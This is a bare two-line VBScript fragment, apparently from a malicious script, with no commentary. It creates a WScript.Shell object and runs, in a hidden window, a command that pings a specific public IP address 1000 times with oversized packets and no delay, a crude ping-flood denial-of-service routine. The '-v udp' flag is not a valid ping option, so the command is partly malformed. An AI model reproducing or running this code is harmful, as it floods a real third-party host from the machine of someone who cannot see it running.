Set src3 = CreateObject("Wscript.shell")
src3.run "command /c ping 203.206.142.65 -n 1000 -l 12874 -w 0 -v udp",0,true
